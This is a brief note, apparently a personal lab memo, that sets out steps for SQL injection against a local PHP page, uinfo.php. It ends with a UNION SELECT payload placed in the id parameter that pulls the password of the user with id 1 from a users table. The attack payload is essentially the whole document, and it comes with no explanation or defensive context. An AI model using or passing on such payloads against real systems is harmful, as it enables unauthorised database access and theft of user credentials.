location URL : localhost/uinfo.php 
add ?id=0
later add command 
localhost/uinfo.php?id=0' UNION SELECT 2,'asd',(select password from users where id=1),",";-- -